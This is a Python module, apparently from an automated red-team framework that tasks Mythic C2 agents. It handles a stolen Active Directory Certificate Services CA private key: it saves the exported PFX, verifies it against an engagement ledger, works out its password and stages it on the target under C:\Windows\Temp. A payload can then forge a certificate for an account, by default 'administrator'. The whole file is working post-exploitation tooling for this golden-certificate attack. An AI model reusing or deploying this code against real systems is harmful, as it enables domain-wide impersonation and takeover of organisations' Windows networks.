"""Runtime materialization for ADCS certificate-auth capabilities.

The capability layer is intentionally payload-agnostic: it says "use verified CA
signing material to obtain certificate-authenticated access", not how a given
Mythic agent should stage files. This module handles only the deterministic local
artifact resolution step shared by Mythic backends: resolve a verified CA PFX from
the durable ledger and return builder-ready staging inputs. The target account
certificate must be forged by a Mythic-tasked payload adapter, never by Sage.
"""

from __future__ import annotations

import base64
from dataclasses import dataclass, field
import hashlib
import os
from pathlib import Path
import re
import stat
from typing import Any, Callable


@dataclass
class CertificateAuthMaterialization:
    ok: bool
    inputs: dict[str, Any] = field(default_factory=dict)
    evidence: dict[str, Any] = field(default_factory=dict)
    missing: list[str] = field(default_factory=list)
    reason: str = ""


KEY_RE = re.compile(
    rb"-----BEGIN (?:RSA |EC |DSA |)PRIVATE KEY-----[\s\S]+?-----END (?:RSA |EC |DSA |)PRIVATE KEY-----",
    re.IGNORECASE,
)
CERT_RE = re.compile(rb"-----BEGIN CERTIFICATE-----[\s\S]+?-----END CERTIFICATE-----", re.IGNORECASE)

_CA_ARTIFACT_KEYS = (
    "pfx_artifact_path",
    "ca_pfx_artifact_path",
    "ca_artifact_path",
    "artifact_path",
    "local_artifact_path",
    "private_key_artifact_path",
)


def persist_verified_ca_pfx_artifact(
    output: Any,
    artifact_dir: str | os.PathLike[str],
    *,
    engagement_key: str,
    ca_host: str,
    domain: str,
) -> dict[str, str]:
    """Persist one raw Mythic-exported CA PFX before the probe is redacted.

    The durable probe intentionally does not retain ``PFX_BASE64``. This helper is
    the one allowed handoff point from raw task output to a local artifact: it
    validates the blob, verifies any declared SHA256, writes a deterministic file,
    and returns only non-secret provenance fields for the ledger.
    """

    pfx_base64 = _output_field(output, "PFX_BASE64")
    artifact_id = _output_field(output, "PFX_ARTIFACT_ID") or _output_field(output, "ARTIFACT_ID")
    if not pfx_base64 or not artifact_id:
        return {}
    try:
        blob = base64.b64decode(re.sub(r"\s+", "", pfx_base64), validate=True)
    except Exception:
        return {}
    if len(blob) < 256 or blob[:1] != b"0":
        return {}
    sha256 = hashlib.sha256(blob).hexdigest()
    declared_sha256 = _output_field(output, "PFX_SHA256").casefold()
    if declared_sha256 and declared_sha256 != sha256:
        return {}

    ca_host = _canonical_ca_host(ca_host, domain)
    domain = _normalize(domain)
    if not ca_host or not domain:
        return {}
    artifact_root = Path(artifact_dir)
    _ensure_private_artifact_dir(artifact_root)
    slug = _slug("_".join(
        part for part in (engagement_key, ca_host, domain, sha256[:16]) if part
    ))
    path = artifact_root / f"adcs_ca_signing_{slug}.pfx"
    if path.exists():
        info = path.lstat()
        if path.is_symlink() or not stat.S_ISREG(info.st_mode) or info.st_uid != os.geteuid() or hashlib.sha256(path.read_bytes()).hexdigest() != sha256:
            return {}
        if stat.S_IMODE(info.st_mode) != 0o600:
            path.chmod(0o600)
    else:
        _write_private_file(path, blob)
    if not _safe_owned_path(path, directory=False, mode=0o600) or _file_sha256(path) != sha256:
        return {}
    return {
        "pfx_artifact_path": str(path),
        "pfx_artifact_id": artifact_id,
        "pfx_artifact_sha256": sha256,
        "pfx_sha256": sha256,
    }


def materialize_adcs_certificate_auth(
    *,
    ledger: dict[str, Any],
    artifact_dir: str | os.PathLike[str],
    engagement_key: str,
    domain: str,
    account: str,
    ca_host: str,
    callback_id: str,
    account_sid: str = "",
    sid_extension_encoding: str = "utf8",
    ca_pfx_password: str = "",
    ca_pfx_password_resolver: Callable[[str, str], str] | None = None,
    forged_pfx_password: str = "",
    remote_ca_pfx_path: str = "",
    remote_forged_pfx_path: str = "",
) -> CertificateAuthMaterialization:
    """Resolve a verified CA PFX for payload-side certificate forging.

    A CA artifact is accepted only when the ledger has an achieved
    ``adcs-ca-private-key:<ca>@<domain>`` effect. The artifact directory is used
    as a path resolver for that verified fact, not as independent proof. Sage does
    not use the CA private key to forge the target certificate itself.
    """

    domain = _normalize(domain)
    account = _normalize(account) or "administrator"
    ca_host = _canonical_ca_host(ca_host, domain)
    callback_id = _normalize_callback(callback_id)
    missing = []
    if not domain:
        missing.append("domain")
    if not account:
        missing.append("account")
    if not ca_host:
        missing.append("ca_host")
    if not callback_id:
        missing.append("callback_id")
    if missing:
        return CertificateAuthMaterialization(False, missing=missing, reason="missing certificate-auth materialization input")

    slug = _slug("_".join(part for part in (account, domain, callback_id) if part))
    try:
        from . import capabilities as _caps
    except ImportError:
        import capabilities as _caps
    # Per-run, non-source-visible artifact passwords. CA export uses SagePfx plus an export-context slug;
    # certificate auth may run later with only ledger evidence, so try inferred export passwords and skip
    # artifacts that cannot actually be opened instead of selecting by filename alone.
    ca_pfx_passwords = _ca_pfx_password_values(
        ledger,
        ca_host=ca_host,
        domain=domain,
        current_callback_id=callback_id,
        certificate_slug=slug,
        explicit_password=ca_pfx_password,
        password_resolver=ca_pfx_password_resolver,
        caps_module=_caps,
    )
    forged_pfx_password = forged_pfx_password or _caps.artifact_secret("SageCert", slug)
    remote_ca_pfx_path = remote_ca_pfx_path or f"C:\\Windows\\Temp\\sage_ca_signing_{slug}.pfx"
    remote_forged_pfx_path = remote_forged_pfx_path or f"C:\\Windows\\Temp\\sage_forged_cert_{slug}.pfx"
    subject_hint = f"{domain.split('.', 1)[0]}-ca"

    artifact_root = Path(artifact_dir)
    ca_artifact, ca_hop, selected_ca_pfx_password = resolve_verified_ca_pfx_artifact(
        ledger,
        artifact_root,
        ca_host,
        domain,
        ca_pfx_password=ca_pfx_passwords,
        subject_hint=subject_hint,
        engagement_key=engagement_key,
    )
    if not ca_artifact:
        usable_artifact, _ = resolve_verified_ca_artifact(
            ledger,
            artifact_root,
            ca_host,
            domain,
            ca_pfx_password=ca_pfx_passwords,
            subject_hint=subject_hint,
            engagement_key=engagement_key,
        )
        if usable_artifact:
            return CertificateAuthMaterialization(
                False,
                missing=["adcs_ca_private_key_pfx_artifact"],
                reason=(
                    "verified CA private-key material exists, but the payload-side certificate forge "
                    "adapter requires a usable PFX artifact"
                ),
            )
        return CertificateAuthMaterialization(
            False,
            missing=["adcs_ca_private_key_artifact"],
            reason=f"no verified usable CA private-key PFX artifact for {ca_host}@{domain}",
        )

    try:
        _ca_key, _ca_cert, ca_subject = load_ca_key_cert_from_artifact(
            ca_artifact,
            selected_ca_pfx_password,
            subject_hint,
        )
    except Exception as exc:
        return CertificateAuthMaterialization(
            False,
            missing=["adcs_ca_private_key_artifact"],
            reason=f"verified CA PFX could not be used for payload-side certificate auth: {exc}",
        )
    ca_artifact_sha256 = hashlib.sha256(ca_artifact.read_bytes()).hexdigest()

    inputs = {
        "domain": domain,
        "target_domain": domain,
        "account": account,
        "ca_host": ca_host,
        "callback_id": callback_id,
        "ca_pfx_path": remote_ca_pfx_path,
        "ca_pfx_password": selected_ca_pfx_password,
        "forged_pfx_path": remote_forged_pfx_path,
        "forged_pfx_password": forged_pfx_password,
        "_local_ca_pfx_path": str(ca_artifact),
    }
    if account_sid:
        inputs["account_sid"] = account_sid
    evidence = {
        "source": "adcs_certificate_materializer",
        "materialization_mode": "stage-ca-pfx-for-payload-forge",
        "ca_host": ca_host,
        "domain": domain,
        "account": account,
        "account_sid": account_sid,
        "sid_extension_encoding": sid_extension_encoding,
        "callback_id": callback_id,
        "ca_subject": ca_subject,
        "ca_artifact_path": str(ca_artifact),
        "ca_artifact_sha256": ca_artifact_sha256,
        "remote_ca_pfx_path": remote_ca_pfx_path,
        "remote_forged_pfx_path": remote_forged_pfx_path,
        "verified_effect": _ca_effect(ca_host, domain),
        "verified_hop_id": str(ca_hop.get("id") or ""),
    }
    return CertificateAuthMaterialization(
        True,
        inputs=inputs,
        evidence=evidence,
        reason="materialized verified CA PFX for payload-side certificate forge",
    )


def resolve_verified_ca_pfx_artifact(
    ledger: dict[str, Any],
    artifact_dir: Path,
    ca_host: str,
    domain: str,
    ca_pfx_password: str | list[str] | tuple[str, ...] | set[str] = "",
    subject_hint: str = "",
    engagement_key: str = "",
) -> tuple[Path | None, dict[str, Any], str]:
    """Return a verified CA PFX plus the exact password required by payload tooling."""
    domain = _normalize(domain)
    ca_host = _canonical_ca_host(ca_host, domain)
    if not ca_host or not domain:
        return None, {}, ""
    effect = _ca_effect(ca_host, domain)
    for hop in reversed(list(ledger.get("hops") or [])):
        if not isinstance(hop, dict):
            continue
        if str(hop.get("status") or "").casefold() != "achieved":
            continue
        effects = {str(hop.get("effect") or "").casefold()}
        effects.update(str(item or "").casefold() for item in hop.get("satisfied_effects") or [])
        if effect not in effects:
            continue
        evidence = hop.get("evidence") if isinstance(hop.get("evidence"), dict) else {}
        proof = _admitted_ca_artifact_proof(hop, engagement_key)
        if proof is None:
            return None, hop, ""
        candidates = _verified_artifact_candidates(evidence, artifact_dir)
        expected_sha256 = proof.artifact_sha256
        for path in _dedupe_paths(candidates):
            if not _safe_artifact_path(path, artifact_dir) or path.suffix.casefold() != ".pfx":
                continue
            if _file_sha256(path) != expected_sha256:
                continue
            usable, selected_password = _usable_ca_pfx_password(path, ca_pfx_password, subject_hint)
            if usable:
                return path, hop, selected_password
        return None, hop, ""
    return None, {}, ""


def resolve_verified_ca_artifact(
    ledger: dict[str, Any],
    artifact_dir: Path,
    ca_host: str,
    domain: str,
    ca_pfx_password: str | list[str] | tuple[str, ...] | set[str] = "",
    subject_hint: str = "",
    engagement_key: str = "",
) -> tuple[Path | None, dict[str, Any]]:
    domain = _normalize(domain)
    ca_host = _canonical_ca_host(ca_host, domain)
    if not ca_host or not domain:
        return None, {}
    effect = _ca_effect(ca_host, domain)
    for hop in reversed(list(ledger.get("hops") or [])):
        if not isinstance(hop, dict):
            continue
        if str(hop.get("status") or "").casefold() != "achieved":
            continue
        effects = {str(hop.get("effect") or "").casefold()}
        effects.update(str(item or "").casefold() for item in hop.get("satisfied_effects") or [])
        if effect not in effects:
            continue
        evidence = hop.get("evidence") if isinstance(hop.get("evidence"), dict) else {}
        proof = _admitted_ca_artifact_proof(hop, engagement_key)
        if proof is None:
            return None, hop
        candidates = _verified_artifact_candidates(evidence, artifact_dir)
        expected_sha256 = proof.artifact_sha256
        for path in _dedupe_paths(candidates):
            if not _safe_artifact_path(path, artifact_dir):
                continue
            if _file_sha256(path) != expected_sha256:
                continue
            if subject_hint:
                try:
                    load_ca_key_cert_from_artifact(path, ca_pfx_password, subject_hint)
                except Exception:
                    continue
            return path, hop
        return None, hop
    return None, {}


def load_ca_key_cert_from_artifact(
    artifact: Path,
    pfx_password: str | list[str] | tuple[str, ...] | set[str],
    subject_hint: str,
):
    from cryptography import x509
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.serialization import pkcs12

    data = artifact.read_bytes()
    if artifact.suffix.casefold() == ".pfx":
        errors = []
        for password in _pfx_password_candidates(pfx_password):
            try:
                key, cert, _cas = pkcs12.load_key_and_certificates(data, password)
                if key is None or cert is None:
                    raise ValueError("PFX does not contain a private key/certificate pair")
                return key, cert, cert.subject.rfc4514_string()
            except Exception as exc:
                errors.append(str(exc))
        raise ValueError(f"{artifact} could not be opened as a CA PFX: {'; '.join(errors[-2:])}")

    keys = [(match.start(), match.group(0)) for match in KEY_RE.finditer(data)]
    certs = [(match.start(), match.group(0)) for match in CERT_RE.finditer(data)]
    if not keys or not certs:
        raise ValueError(f"{artifact} does not contain PEM private key and certificate material")

    candidates = []
    for cert_pos, cert_pem in certs:
        cert = x509.load_pem_x509_certificate(cert_pem)
        subject = cert.subject.rfc4514_string()
        issuer = cert.issuer.rfc4514_string()
        is_ca = issuer == subject
        try:
            is_ca = bool(cert.extensions.get_extension_for_class(x509.BasicConstraints).value.ca or is_ca)
        except Exception:
            pass
        preceding = [(pos, pem) for pos, pem in keys if pos < cert_pos]
        if not preceding:
            continue
        key = serialization.load_pem_private_key(preceding[-1][1], password=None)
        try:
            key_matches = _public_key_bytes(key) == cert.public_key().public_bytes(
                serialization.Encoding.DER,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            )
        except Exception:
            key_matches = False
        if not key_matches:
            continue
        score = 0
        if is_ca:
            score += 10
        if subject_hint and subject_hint.casefold() in subject.casefold():
            score += 5
        if "ca" in subject.casefold():
            score += 1
        candidates.append((score, subject, key, cert))
    if not candidates:
        raise ValueError(f"{artifact} did not contain a matching CA private key/certificate pair")
    candidates.sort(key=lambda item: item[0], reverse=True)
    _score, subject, key, cert = candidates[0]
    return key, cert, subject


def _candidate_paths(evidence: dict[str, Any]) -> list[Path]:
    paths = []
    for source in _evidence_sources(evidence):
        for key in _CA_ARTIFACT_KEYS:
            text = str(source.get(key) or "").strip()
            if text:
                paths.append(Path(text))
    return paths


def _admitted_ca_artifact_proof(hop: dict[str, Any], engagement_key: str):
    try:
        try:
            from . import proof_boundary
        except ImportError:
            import proof_boundary
    except Exception:
        return None
    evidence = hop.get("evidence") if isinstance(hop.get("evidence"), dict) else {}
    proof = hop.get("proof_envelope") if isinstance(hop.get("proof_envelope"), dict) else evidence.get("proof_envelope")
    admission = proof_boundary.admit_runtime_envelope(
        proof_boundary.ProofEnvelope.from_dict(proof),
        current_engagement_id=engagement_key,
    )
    if not admission.admitted or admission.envelope is None:
        return None
    if admission.envelope.origin != proof_boundary.ORIGIN_MYTHIC_ARTIFACT:
        return None
    evidence_artifact_id = ""
    evidence_sha256 = ""
    for source in _evidence_sources(evidence):
        evidence_artifact_id = evidence_artifact_id or str(source.get("pfx_artifact_id") or "").strip()
        evidence_sha256 = evidence_sha256 or str(source.get("pfx_artifact_sha256") or source.get("pfx_sha256") or "").strip().casefold()
    if evidence_artifact_id != admission.envelope.artifact_id:
        return None
    if evidence_sha256 and evidence_sha256 != admission.envelope.artifact_sha256:
        return None
    return admission.envelope


def _safe_artifact_path(path: Path, artifact_dir: Path) -> bool:
    try:
        root = artifact_dir.absolute()
        candidate = path.absolute()
        if not _safe_owned_path(root, directory=True, mode=0o700) or not _safe_owned_path(candidate, directory=False, mode=0o600):
            return False
        candidate.resolve(strict=True).relative_to(root.resolve(strict=True))
        current = candidate.parent
        while current != root and current != current.parent:
            if not _safe_owned_path(current, directory=True, mode=0o700):
                return False
            current = current.parent
        return True
    except Exception:
        return False


def _safe_owned_path(path: Path, *, directory: bool, mode: int) -> bool:
    info = path.lstat()
    kind_ok = stat.S_ISDIR(info.st_mode) if directory else stat.S_ISREG(info.st_mode)
    return kind_ok and not stat.S_ISLNK(info.st_mode) and info.st_uid == os.geteuid() and stat.S_IMODE(info.st_mode) == mode


def _verified_artifact_candidates(evidence: dict[str, Any], artifact_dir: Path) -> list[Path]:
    """Return only explicit hop-bound artifact paths inside the configured artifact root."""
    del artifact_dir
    return _candidate_paths(evidence)


def _output_field(output: Any, field: str) -> str:
    if output is None:
        return ""
    text = output.decode(errors="replace") if isinstance(output, bytes) else str(output)
    text = text.replace("\\r\\n", "\n").replace("\\n", "\n").replace("\\r", "\n")
    pattern = re.compile(rf"(?im)^\s*{re.escape(field)}\s*[:=]\s*(.*?)\s*$")
    for match in pattern.finditer(text):
        value = match.group(1).strip().strip("'\"")
        if value:
            return value
    return ""


def _file_sha256(path: Path) -> str:
    try:
        return hashlib.sha256(path.read_bytes()).hexdigest()
    except Exception:
        return ""


def _evidence_sources(evidence: dict[str, Any]) -> list[dict[str, Any]]:
    sources = [evidence] if isinstance(evidence, dict) else []
    for key in ("probe", "verification", "materialized", "artifact", "artifacts"):
        value = evidence.get(key) if isinstance(evidence, dict) else None
        if isinstance(value, dict):
            sources.append(value)
    return sources


def _dedupe_paths(paths: list[Path]) -> list[Path]:
    out = []
    seen = set()
    for path in paths:
        key = str(path)
        if key in seen:
            continue
        seen.add(key)
        out.append(path)
    return out


def _public_key_bytes(value: Any) -> bytes:
    from cryptography.hazmat.primitives import serialization

    return value.public_key().public_bytes(
        serialization.Encoding.DER,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )


def _usable_ca_pfx_password(
    artifact: Path,
    pfx_password: str | list[str] | tuple[str, ...] | set[str],
    subject_hint: str,
) -> tuple[bool, str]:
    from cryptography.hazmat.primitives.serialization import pkcs12

    try:
        data = artifact.read_bytes()
    except Exception:
        return False, ""
    for password_text in _pfx_password_text_candidates(pfx_password):
        password = password_text.encode() if password_text else None
        try:
            key, cert, _cas = pkcs12.load_key_and_certificates(data, password)
        except Exception:
            continue
        if key is None or cert is None:
            continue
        if subject_hint and subject_hint.casefold() not in cert.subject.rfc4514_string().casefold():
            continue
        return True, password_text
    return False, ""


def _ca_pfx_password_values(
    ledger: dict[str, Any],
    *,
    ca_host: str,
    domain: str,
    current_callback_id: str,
    certificate_slug: str,
    explicit_password: str,
    password_resolver: Callable[[str, str], str] | None,
    caps_module: Any,
) -> list[str]:
    values: list[str] = []

    def add(value: Any) -> None:
        text = str(value or "").strip()
        if text and text not in values:
            values.append(text)

    add(explicit_password)
    add(os.environ.get("SAGE_ADCS_CA_PFX_PASSWORD"))
    del ledger, current_callback_id, certificate_slug, caps_module
    if callable(password_resolver):
        add(password_resolver(ca_host, domain))
    return values


def _hop_callback_ids(hop: dict[str, Any]) -> list[str]:
    ids: list[str] = []

    def add(value: Any) -> None:
        callback_id = _normalize_callback(value)
        if callback_id and callback_id not in ids:
            ids.append(callback_id)

    add(hop.get("callback_id") or hop.get("callback"))
    for match in re.findall(r"(?:^|[;:_-])callback=?((?:cb)?\d+)", str(hop.get("id") or ""), re.IGNORECASE):
        add(match)
    evidence = hop.get("evidence") if isinstance(hop.get("evidence"), dict) else {}
    for source in _evidence_sources(evidence):
        add(source.get("callback_id") or source.get("callback") or source.get("callback_display_id"))
    return ids


def _pfx_password_candidates(value: str | list[str] | tuple[str, ...] | set[str]) -> list[bytes | None]:
    out: list[bytes | None] = []
    values = list(value) if isinstance(value, (list, tuple, set)) else [value]
    for item in values:
        text = str(item or "").strip()
        if text:
            out.append(text.encode())
    out.extend([b"", None])
    deduped: list[bytes | None] = []
    for item in out:
        if item not in deduped:
            deduped.append(item)
    return deduped


def _pfx_password_text_candidates(value: str | list[str] | tuple[str, ...] | set[str]) -> list[str]:
    out: list[str] = []
    values = list(value) if isinstance(value, (list, tuple, set)) else [value]
    for item in values:
        text = str(item or "").strip()
        if text and text not in out:
            out.append(text)
    if "" not in out:
        out.append("")
    return out


def _ca_effect(ca_host: str, domain: str) -> str:
    canonical_host = _canonical_ca_host(ca_host, domain)
    target_domain = _normalize(domain)
    return f"adcs-ca-private-key:{canonical_host}@{target_domain}" if canonical_host and target_domain else ""


def _host_short(value: Any) -> str:
    text = _normalize(value).strip("\\/")
    if "/" in text and not text.startswith("\\\\"):
        _, _, text = text.partition("/")
    if "@" in text:
        text = text.split("@", 1)[0]
    if text.endswith("$"):
        text = text[:-1]
    return text.split(".", 1)[0].strip()


def _canonical_ca_host(value: Any, domain: Any) -> str:
    try:
        try:
            from . import capabilities
        except ImportError:
            import capabilities
        return capabilities.canonical_host_for_domain(value, domain)
    except Exception:
        return ""


def _ensure_private_artifact_dir(path: Path) -> None:
    if not path.exists():
        path.mkdir(parents=True, mode=0o700, exist_ok=True)
    info = path.lstat()
    if stat.S_ISLNK(info.st_mode) or not stat.S_ISDIR(info.st_mode) or info.st_uid != os.geteuid():
        raise ValueError("artifact directory is unsafe")
    if stat.S_IMODE(info.st_mode) != 0o700:
        path.chmod(0o700)


def _write_private_file(path: Path, data: bytes) -> None:
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL | getattr(os, "O_NOFOLLOW", 0), 0o600)
    try:
        view = memoryview(data)
        while view:
            written = os.write(fd, view)
            if written <= 0:
                raise OSError("artifact write made no progress")
            view = view[written:]
        os.fsync(fd)
    finally:
        os.close(fd)


def _normalize_callback(value: Any) -> str:
    text = _normalize(value)
    if text.startswith("cb") and text[2:].isdigit():
        return text[2:]
    return text if text.isdigit() else ""


def _normalize(value: Any) -> str:
    if value is None:
        return ""
    return " ".join(str(value).strip().casefold().split())


def _slug(value: Any) -> str:
    text = re.sub(r"[^a-zA-Z0-9]+", "_", str(value or "").strip().lower())
    text = re.sub(r"_+", "_", text).strip("_")
    return text or "target"
